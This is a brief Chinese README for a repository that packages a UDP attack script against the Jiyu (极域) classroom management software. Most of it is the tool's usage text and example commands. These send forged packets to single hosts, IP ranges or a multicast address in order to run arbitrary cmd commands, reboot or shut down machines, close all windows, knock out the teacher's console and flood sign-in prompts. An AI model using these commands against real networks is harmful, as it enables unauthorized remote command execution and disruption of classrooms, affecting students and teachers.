# my_jiyu
极域,学习
Jiyu_udp_attack脚本来自 https://github.com/ht0Ruial/Jiyu_udp_attack
# Use
'''
            usage: 
            Attack.py -i <ip> -p <port> -m <message> -c <command> -r -s -k -t -l -h
             
            Attack.py --ip <ip> --port <port> --message <message> --command <command> 
                    --reboot --shutdown --kill --time --loop --help --caw --ctw --sih 
                    --echo --sip --sport --mydata
           --------------------------------------------------------------
           -i[ip]:                      目标IP地址,形如 224.50.50.42 或
                                        172.25.10.1-255 或 172.25.10.1/24
                                         这样的单个/多个ip或整个网段。  
                                         注：224.50.50.42是组播地址，可用
                                         于全频道攻击。
           -p[port]:                     接收方端口,默认4705。
           -m[message]:                  要发送的消息。
           -c[command]:                  要执行的cmd命令。
           -r[reboot]:                   重启目标机器。
           -s[shutdown]:                 关闭目标机器。
           -k[kill]:                     挤下教师端。    
                                         注:教师端会提示,断腿操作!慎!!!!
           -t[time]:                     设置循环执行的时间间隔,默认为5秒
           -l[loop]:                     设置循环次数,默认为1次
           --caw[close_all_windows]:     关闭目标所有程序
           --ctw[close_top_windows]:     关闭目标顶端窗口
           --sih[sign_in_harassment]:    签到骚扰
           -h[help]:                     帮助菜单。
           --sip[source_ip]:             发包的ip,没啥用,Windows XP 后已经
                                         禁止更改发包ip了
           --sport:                      发包端口,默认随机 
           --echo:                       开启回显,默认关闭
           --mydata:                     独立选项,发送16进制原始数据.此项与
                                         其他功能选项互斥(不包括ip,port,
                                         sip,sport,echo,loop,time)
           **************************************************************\n
           例:
           Attack.py -i 224.50.50.42-224 -m "Test" 
           Attack.py -i 224.50.50.42/24 -m "Test" -t 3 -l 5
           Attack.py -i 224.50.50.42 -c "for /l %i in (1,1,10) do (@pause)"
           Attack.py -i 224.50.50.42 -k
           Attack.py -i 224.50.50.42 --sih -t 1 -l 200 --echo -m "Ha Ha Ha"
  
# 
            其中部分功能不可用,例如kill,需要自己改包的教师端ip
